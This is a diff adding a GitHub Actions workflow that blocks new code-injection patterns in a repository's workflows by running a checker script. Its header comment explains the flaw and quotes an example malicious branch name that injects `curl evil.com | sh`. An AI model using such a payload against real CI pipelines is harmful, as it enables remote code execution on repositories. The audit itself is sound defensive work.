@@ -1,0 +1,65 @@
+name: Actions Injection Audit
+
+# Why this exists
+# ---------------
+# Blocks new GitHub Actions code-injection patterns from landing in the repo.
+# Specifically, interpolating `${{ github.event.* }}` or `${{ inputs.* }}`
+# directly into a `run:` shell block — the pattern flagged as critical by
+# CodeQL rule `actions/code-injection/critical` (CWE-094).
+#
+# In a `pull_request_target` context, the attacker-influenced branch name
+# `'; curl evil.com | sh; #` becomes shell code when the runtime substitutes
+# it. With `contents: write` permission on those workflows, that's RCE on
+# the base repo. See BI-5940955C for the canonical writeup.
+#
+# The fix is mechanical: pass the value through an `env:` block and reference
+# the env var in shell. GitHub correctly quotes env values; the shell then
+# sees a normal variable, not interpolated code.
+#
+# Baseline
+# --------
+# Pre-existing accepted occurrences live in
+# docs/security/actions-injection-baseline.json. Each carries a `trackedBy`
+# BI for burn-down. New occurrences (not in the baseline) fail this audit.
+#
+# Why duplicate CodeQL?
+# ---------------------
+# CodeQL's `actions/code-injection/*` queries catch the same pattern. This
+# audit runs faster (~1s, no waiting for CodeQL completion), runs even if
+# CodeQL is misconfigured, and makes the invariant legible by name.
+
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: audit-actions-injection-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  audit:
+    name: Actions Injection Audit
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - uses: actions/checkout@v6
+
+      - name: Set up Node.js
+        uses: actions/setup-node@v6
+        with:
+          node-version: 24
+
+      - name: Scan workflows for dangerous expressions in run blocks
+        # The expression syntax that's flagged by this audit is too dangerous
+        # to put in a step `name:` field — GitHub Actions tries to evaluate
+        # the substring as a template expression at workflow-startup time
+        # and the workflow fails before any job runs. Description lives in
+        # the YAML header instead. See the hotfix PR that introduced this
+        # rewording.
+        run: node scripts/security/check-actions-injection.mjs
